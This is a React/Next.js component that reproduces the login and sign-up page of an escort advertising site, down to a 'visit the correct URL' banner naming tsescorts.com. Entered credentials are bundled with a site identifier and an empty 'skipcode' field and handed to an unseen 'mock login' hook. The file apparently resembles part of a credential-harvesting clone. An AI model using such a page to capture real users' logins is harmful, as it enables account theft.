import { useState } from "react";
import Image from "next/image";
import { Field, Form, Formik } from "formik";
import { FaEye, FaEyeSlash, FaLock } from "react-icons/fa";
import { site } from "../config";
import Check from "../public/images/red_check.png";
import useMockLogin from "../hooks/useMockLogin";

function Login() {
  const [showPassword, setShowPassword] = useState(false);

  const initialvalues = {
    email: "",
    password: "",
    remember: true,
  };

  const { login } = useMockLogin();

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);

    // console.log(submitValues);
  };

  return (
    <div className="bg-custom-gray9 text-custom-gray12">
      <div className="mx-auto lg:max-w-[1200px] px-[15px]  pt-[24px] pb-[24px] lg:pb-[226px]">
        <div className="text-3xl">
          <span className="text-custom-red2">Login /</span>
          <span className=""> Sign Up</span>
        </div>
        <div className="mt-2 flex flex-col lg:flex-row gap-5 lg:gap-8 lg:justify-between">
          <div className="flex-1 lg:ml-4 bg-white px-[10px] py-4 rounded-lg border border-slate-300 shadow-around-sm">
            <h4 className="text-[21px] font-bold text-custom-red2">Log In</h4>
            <div className="mt-1 bg-custom-lime rounded text-[14px] text-custom-gray12 pl-[5px] pr-[2px] py-1">
              <div className="flex flex-wrap break-words">
                <p className="">
                  Please make sure you are visiting the correct URL:
                </p>

                <span className="lg:ml-[5px] text-black bg-white px-[8px] py-[1px] border border-slate-300 flex items-center gap-1 rounded">
                  <FaLock size={12} /> tsescorts.com
                </span>
              </div>
            </div>
            <div className="mt-[10px]">
              <Formik
                initialValues={initialvalues}
                // validationSchema={validate}
                onSubmit={handleSubmit}
              >
                {(formik) => (
                  <Form className="space-y-[14px]">
                    <div className="lg:flex items-center gap-[30px]">
                      <label htmlFor="email" className="text-[15px] font-bold">
                        Phone or Email
                      </label>
                      <Field
                        className="flex-1 w-full outline-none border border-slate-300 px-3 py-1 rounded focus:border-blue-400 focus:shadow-around-blue transition duration-300"
                        placeholder="email@address.com"
                        name="email"
                        type="email"
                        required
                      />
                    </div>
                    <div className="lg:ml-10 lg:flex items-center gap-[30px]">
                      <label
                        htmlFor="password"
                        className="text-[15px] font-bold"
                      >
                        Password
                      </label>

                      <div className="flex w-full">
                        <Field
                          className="flex-1 w-full outline-none border border-slate-300 px-3 py-1 rounded rounded-r-none focus:border-blue-400 focus:shadow-around-blue transition duration-300"
                          placeholder="Enter Password"
                          name="password"
                          type={showPassword ? "text" : "password"}
                          autoComplete="on"
                          required
                        />
                        <button
                          type="button"
                          className="p-2 border border-l-0 border-slate-400/30 rounded-r hover:bg-custom-gray7"
                          onClick={() => setShowPassword(!showPassword)}
                        >
                          {showPassword ? <FaEye /> : <FaEyeSlash />}
                        </button>
                      </div>
                    </div>
                    <div className="ml-[47px] mt-5 flex justify-end lg:justify-start items-center gap-1">
                      <Field type="checkbox" name="remember" id="remember" />
                      <label
                        htmlFor="remember"
                        className="font-bold text-black text-[14px]"
                      >
                        Remember me on this device
                      </label>
                    </div>

                    <div className="flex justify-end">
                      <button
                        type="submit"
                        className="lg:mt-[-26px] bg-custom-blue3 hover:bg-custom-blue5 px-[90px] py-[8px] text-[13px] text-white font-medium rounded uppercase"
                      >
                        ENTER
                      </button>
                    </div>
                  </Form>
                )}
              </Formik>
            </div>
            <p className="mt-3 mb-3 font-bold text-[14px] text-black">
              Visit here for{" "}
              <span className="text-custom-blue3 hover:underline cursor-pointer">
                Forgot Password.
              </span>
            </p>
          </div>

          <div className="flex-1 bg-custom-gray7  px-3 pt-4 pb-14 rounded-lg border border-slate-400/30 shadow-around-sm">
            <h4 className="text-[21px] font-bold text-custom-red2">
              Not a Member
            </h4>
            <div className="mt-1 leading-[15px] text-[14px] font-bold text-black">
              <p className="">It is quick and easy to register</p>
              <p className="">Get Exposed to Thousands of Potential Clients</p>
            </div>

            <div className="mt-5 text-[14px] text-black">
              <div className="flex items-center gap-1 bg-white">
                <Image src={Check} alt="check" />
                <p className="">Get a Custom Profile, Upload & Edit Photos</p>
              </div>
              <div className="flex items-center gap-1 bg-transparent">
                <Image src={Check} alt="check" />
                <p className="">Display Rates, Services, Schedule & Info</p>
              </div>
              <div className="flex items-center gap-1 bg-white">
                <Image src={Check} alt="check" />
                <p className="">Get Featured... Get Noticed... Get Bookings</p>
              </div>
            </div>

            <div className="mt-[30px] flex justify-center">
              <button
                type="button"
                className=" bg-custom-blue3 hover:bg-custom-blue5 px-[54px] py-[8px] text-[13px] text-white font-medium rounded uppercase"
              >
                Create Account
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Login;
